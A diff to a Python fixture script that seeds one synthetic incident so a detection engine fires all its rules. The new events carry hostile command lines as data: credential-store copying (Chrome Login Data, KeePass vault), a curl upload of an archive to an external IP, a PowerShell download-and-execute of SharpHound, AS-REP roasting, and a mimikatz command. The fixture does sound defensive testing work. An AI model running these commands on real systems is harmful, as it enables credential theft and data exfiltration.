@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 88 rules
+job: it is a regression fixture and a coverage demo, built to fire all 103 rules
 -- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
 12, 13, 15, 17, 20, 22, 23, 25) plus a handful of EventIDs no rule keys on (18,
 19, 21) added purely so the incident's raw event stream and process tree show
@@ -55,13 +55,27 @@ machine. The phases, roughly in kill-chain order:
                   │   PowerShell v2 downgrade, an AMSI-bypass command line,
                   │   bitsadmin /transfer, a COM CLSID hijack, and a
                   │   token-theft tool keyword (SYS-108 through SYS-123)
-                  └─ coverage-expansion pass 3: a hollowed/doppelganged
-                      process, RawCopy reading a volume directly, a
-                      timestomped DLL, a DCSync request, and a
-                      sekurlsa::logonpasswords command line, plus a DNS
-                      query to a dynamic-DNS domain and a self-deleting
-                      dropper reusing earlier actors (SYS-124 through
-                      SYS-131)
+                  ├─ coverage-expansion pass 3: a hollowed/doppelganged
+                  │   process, RawCopy reading a volume directly, a
+                  │   timestomped DLL, a DCSync request, and a
+                  │   sekurlsa::logonpasswords command line, plus a DNS
+                  │   query to a dynamic-DNS domain and a self-deleting
+                  │   dropper reusing earlier actors (SYS-124 through
+                  │   SYS-131)
+                  └─ coverage-expansion pass 4: odbcconf REGSVR proxy exec,
+                      mmc loading a staged .msc, a non-browser process
+                      writing "Login Data" into Temp (both the process- and
+                      path-based credential-DB rules at once), a KeePass
+                      .kdbx touched by PowerShell, netstat -ano, a recursive
+                      dir /s, tasklist piped through a Defender/SentinelOne
+                      grep, a 7-Zip archive with -mhe, a curl -T upload,
+                      SharpHound invoked via -CollectionMethod, and
+                      Impacket's GetNPUsers.py -- rclone (SYS-143), netsh
+                      interface (SYS-138), and net group/nltest (SYS-149)
+                      are not repeated here: earlier phases already emit
+                      command lines that satisfy those three (SYS-132,
+                      SYS-133, SYS-135, SYS-136, SYS-137, SYS-139, SYS-140,
+                      SYS-141, SYS-142, SYS-144, SYS-148, SYS-150)
               └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
@@ -78,6 +92,8 @@ from __future__ import annotations
 import argparse
 import random
 from datetime import datetime, timedelta, timezone
+
+import httpx
 
 from seed_common import EventFactory, post_events
 
@@ -100,7 +116,9 @@ EXPECTED_RULES = {
     "SYS-107", "SYS-108", "SYS-109", "SYS-110", "SYS-111", "SYS-112", "SYS-113",
     "SYS-114", "SYS-115", "SYS-116", "SYS-117", "SYS-118", "SYS-119", "SYS-120",
     "SYS-121", "SYS-122", "SYS-123", "SYS-124", "SYS-125", "SYS-126", "SYS-127",
-    "SYS-128", "SYS-129", "SYS-130", "SYS-131",
+    "SYS-128", "SYS-129", "SYS-130", "SYS-131", "SYS-132", "SYS-133", "SYS-135",
+    "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
+    "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150",
 }
 
 
@@ -214,6 +232,18 @@ G = {
     "timestomp": "{rng-timestomp}",
     "dcsync": "{rng-dcsync}",
     "mimikatz_sekurlsa": "{rng-mimikatz-sekurlsa}",
+    # Coverage-expansion pass 4 (SYS-132 through SYS-150).
+    "odbcconf": "{rng-odbcconf}",
+    "mmc_console": "{rng-mmc-console}",
+    "cred_stager": "{rng-cred-stager}",
+    "keepass_touch": "{rng-keepass-touch}",
+    "netstat_enum": "{rng-netstat-enum}",
+    "dir_recurse": "{rng-dir-recurse}",
+    "av_discovery": "{rng-av-discovery}",
+    "archive_mhe": "{rng-archive-mhe}",
+    "curl_upload": "{rng-curl-upload}",
+    "sharphound_ps1": "{rng-sharphound-ps1}",
+    "asrep_roast": "{rng-asrep-roast}",
 }
 
 
@@ -685,6 +715,70 @@ def events() -> list[dict]:
                     r'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"',
                     pid=5440, ppid=4510, integrity="High"))
 
+    # === Coverage-expansion pass 4: SYS-132 through SYS-150, off "ops" ===
+    # SYS-143 (rclone remote), SYS-138 (netsh interface) and SYS-149 (net
+    # group / nltest) are not repeated here -- G["rclone"], G["netsh"], and
+    # G["net"]/G["nltest"] above already emit command lines that satisfy
+    # them, discovered when this pass was designed rather than duplicated.
+    ev.append(proc(step(1), G["odbcconf"], G["ops"], r"C:\Windows\System32\odbcconf.exe",
+                    r'odbcconf.exe /A {REGSVR "evil.dll"}', pid=5450, ppid=4510))
+
+    ev.append(proc(step(1), G["mmc_console"], G["ops"], r"C:\Windows\System32\mmc.exe",
+                    r"mmc.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.msc",
+                    pid=5460, ppid=4510))
+
+    # A non-browser process stages Chrome's credential store into Temp --
+    # one event, but it satisfies both the process-identity rule (SYS-135)
+    # and the staging-path rule (SYS-137) at once, by design.
+    ev.append(proc(step(1), G["cred_stager"], G["ops"], r"C:\Windows\System32\cmd.exe",
+                    r'cmd.exe /c copy "C:\Users\redteam.ops\AppData\Local\Google\Chrome\User Data'
+                    r'\Default\Login Data" "C:\Users\redteam.ops\AppData\Local\Temp\Login Data"',
+                    pid=5470, ppid=4510))
+    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\cmd.exe",
+                         ProcessGuid=G["cred_stager"],
+                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\Login Data"))
+
+    ev.append(proc(step(1), G["keepass_touch"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell -nop -c \"Copy-Item 'C:\Users\redteam.ops\Documents\vault.kdbx' "
+                    r"'C:\Users\redteam.ops\AppData\Local\Temp\vault.kdbx'\"",
+                    pid=5480, ppid=4510))
+    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                         ProcessGuid=G["keepass_touch"],
+                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\vault.kdbx"))
+
+    ev.append(proc(step(1), G["netstat_enum"], G["ops"], r"C:\Windows\System32\netstat.exe",
+                    "netstat.exe -ano", pid=5490, ppid=4510))
+
+    ev.append(proc(step(1), G["dir_recurse"], G["ops"], r"C:\Windows\System32\cmd.exe",
+                    r"cmd.exe /c dir /s C:\Users\redteam.ops\Documents",
+                    pid=5500, ppid=4510))
+
+    ev.append(proc(step(1), G["av_discovery"], G["ops"], r"C:\Windows\System32\cmd.exe",
+                    r'cmd.exe /c tasklist | findstr /i "sentinelone defender"',
+                    pid=5510, ppid=4510))
+
+    ev.append(proc(step(1), G["archive_mhe"], G["ops"], r"C:\Program Files\7-Zip\7z.exe",
+                    r"7z.exe a -mhe -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil2.7z "
+                    r"C:\Users\redteam.ops\Documents",
+                    pid=5520, ppid=4510))
+
+    ev.append(proc(step(1), G["curl_upload"], G["ops"], r"C:\Windows\System32\curl.exe",
+                    r"curl.exe -T C:\Users\redteam.ops\AppData\Local\Temp\exfil2.7z "
+                    r"https://45.132.192.68/upload",
+                    pid=5530, ppid=4510))
+
+    ev.append(proc(step(1), G["sharphound_ps1"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
+                    r"DownloadString('http://45.132.192.68/SharpHound.ps1'); "
+                    r"Invoke-BloodHound -CollectionMethod All\"",
+                    pid=5540, ppid=4510))
+
+    ev.append(proc(step(1), G["asrep_roast"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\GetNPUsers.py",
+                    r"GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -no-pass",
+                    pid=5550, ppid=4510, integrity="High"))
+
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
                     r"ftp.exe -s:C:\Users\redteam.ops\AppData\Local\Temp\ftp.txt",
@@ -769,6 +863,36 @@ def main() -> int:
         print("Confirmed: everything correlated into a single incident.")
     elif len(incident_ids) > 1:
         print("Warning: the run split across more than one incident.")
+
+    # This incident's rule IDs satisfy all three _CORRELATION_CHAINS patterns
+    # at once (SYS-004+SYS-080/081 for ransomware, two-plus of
+    # SYS-010/041/130/131 for the credential campaign, SYS-001+SYS-009 for
+    # office-to-PowerShell) -- but Incident.classification returns only the
+    # first match in chain-priority order, "ransomware", the same
+    # first-match-wins rule _NARRATIVES already uses. That is expected, not
+    # a bug: it is what the title reports, so this check confirms the
+    # highest-priority chain specifically, rather than asserting all three
+    # are independently visible on one incident.
+    if len(incident_ids) == 1:
+        incident_id = next(iter(incident_ids))
+        base_url = args.url.rsplit("/ingest", 1)[0]
+        try:
+            resp = httpx.get(f"{base_url}/incidents/{incident_id}", timeout=10.0)
+            resp.raise_for_status()
+            inc = resp.json()
+        except httpx.HTTPError as exc:
+            print(f"\n! could not verify classification: {exc}")
+        else:
+            classification = inc.get("classification")
+            print(f"\nIncident classification: {classification or '(none)'}")
+            print(f"Incident title: {inc.get('title')}")
+            if classification == "ransomware":
+                print("Confirmed: the ransomware correlation chain (highest priority) fired.")
+            else:
+                print(
+                    "Warning: expected classification 'ransomware' (see "
+                    "_CORRELATION_CHAINS in backend/models/schemas.py)."
+                )
 
     print(f"\nOpen http://localhost:8000 and expand the {HOST} incident.")
     return 0
